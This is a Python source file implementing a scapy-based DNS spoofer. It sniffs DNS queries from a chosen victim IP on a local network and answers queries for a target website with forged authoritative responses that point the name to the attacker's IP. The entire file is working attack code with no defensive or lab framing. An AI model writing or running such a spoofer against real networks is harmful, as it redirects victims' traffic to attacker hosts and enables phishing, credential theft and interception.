from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from logger import log_info, log_warning

class DNSSpoofer:
    def __init__(self, interface, ip_attacker, ip_victim, website_to_spoof):
        self.interface = interface
        self.ip_attacker = ip_attacker
        self.ip_victim = ip_victim
        self.website_to_spoof = website_to_spoof

    def spoof(self):
        log_info("Starting DNS spoofing")
        sniff(
            filter="udp and port 53",
            prn=self._on_dns_request,
            iface=self.interface,
            count=0,
        )
        log_warning("Stopping DNS spoofing")

    def _on_dns_request(self, packet):
        # Check that we received a DNS query from the victim for the website we want to spoof.
        if (
            packet.haslayer(DNSQR)
            and packet[DNS].qr == 0
            and packet[IP].src == self.ip_victim
            and self.website_to_spoof in packet[DNSQR].qname.decode("utf-8")
        ):
            log_info(
                "Received DNS query for {} from {}".format(
                    packet[DNSQR].qname, packet[IP].src
                )
            )
            # Construct the DNS response
            response = (
                IP(dst=packet[IP].src, src=packet[IP].dst)
                / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
                / DNS(
                    id=packet[DNS].id,
                    qd=packet[DNS].qd,
                    aa=1,
                    qr=1,
                    an=DNSRR(rrname=packet[DNSQR].qname, rdata=self.ip_attacker),
                )
            )

            send(response, verbose=0)
            log_info("Sent DNS response for {} to {}".format(packet[DNSQR].qname, packet[IP].src))
        else:
            log_warning("Ignoring packet for {} from {}".format(packet[DNSQR].qname, packet[IP].src))